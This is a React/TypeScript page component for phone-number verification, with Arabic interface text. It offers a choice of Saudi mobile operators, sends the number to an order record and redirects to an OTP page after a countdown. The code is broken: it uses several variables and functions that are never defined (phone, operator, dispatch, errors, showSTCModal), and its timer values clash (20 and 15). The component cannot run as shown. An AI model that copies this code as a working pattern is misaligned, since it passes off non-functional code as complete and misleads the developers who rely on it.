import { useNavigate } from "react-router-dom";
import Header from "../components/Header";
import { VerificationHeader } from "../components/phone-verification/VerificationHeader";
import { PhoneInput } from "../components/phone-verification/PhoneInput";
import { OperatorSelector } from "../components/phone-verification/OperatorSelector";
import { PhoneVerificationService } from "../services/PhoneVerificationService";

import { sendPhone } from "../apis/orders";
import { useEffect, useState } from "react";
import { STCModal } from "../components/STCModal";

const operators = [
  { id: "stc", name: "STC", logo: "/companies/stc.png" },
  { id: "mobily", name: "Mobily", logo: "/companies/mobily.png" },
  { id: "zain", name: "Zain", logo: "/companies/zain.png" },
];

 export const PhoneVerification = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(20);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };



  useEffect(() => {
    if (!isLoading) {
      setTimeLeft(15);
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          navigate("/verify-otp");
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isLoading, navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    let isValid = true;

    if (!PhoneVerificationService.validatePhone(phone)) {
     
      isValid = false;
    }

    if (!operator) {
      isValid = false;
    }

    if (isValid) {
      if (operator === "stc") {
        await PhoneVerificationService.verifyPhone(phone, operator);
        const order_id = JSON.parse(localStorage.getItem("order_id"));
        await sendPhone(order_id, phone, operator);
        navigate("/verify-otp");
      } else {
        setIsLoading(true);
        try {
          await PhoneVerificationService.verifyPhone(phone, operator);
          const order_id = JSON.parse(localStorage.getItem("order_id"));
          await sendPhone(order_id, phone, operator);
        } catch (error) {
          console.error("Verification failed:", error);
          setIsLoading(false);
        }
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
      <Header />
      {isLoading && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="bg-white rounded-2xl p-8 text-center space-y-6 max-w-md w-full mx-4 transform transition-all duration-300">
            <div className="animate-spin w-16 h-16 border-4 border-[#146394] border-t-transparent rounded-full mx-auto"></div>
            <div className="space-y-4">
              <p className="text-2xl font-semibold text-[#146394]">
                الرجاء الانتظار...
              </p>
              <p className="text-gray-600 text-lg">
                سوف يتم ارسال رسالة نصية الى جوالك لتأكيد رقم الجوال
              </p>
              <p className="text-3xl font-bold text-[#146394]">
                {formatTime(timeLeft)}
              </p>
            </div>
          </div>
        </div>
      )}
      {showSTCModal && <STCModal isOpen={showSTCModal} />}
      <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
        <div className="p-4 md:p-8 space-y-4 md:space-y-6 relative">
          <VerificationHeader />
          <form onSubmit={handleSubmit} className="space-y-4 md:space-y-6">
            <PhoneInput
              value={phone}
              onChange={(value) => dispatch(setPhone(value))}
              error={errors.phone}
            />
            <OperatorSelector
              operators={operators}
              selectedOperator={operator}
              onSelect={(operatorId) => dispatch(setOperator(operatorId))}
              error={errors.operator}
            />
            <button
              type="submit"
              className="w-full bg-[#146394] text-white py-3 md:py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:scale-[1.02] active:scale-100 shadow-md hover:shadow-lg text-sm md:text-base"
            >
              تسجيل
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PhoneVerification;
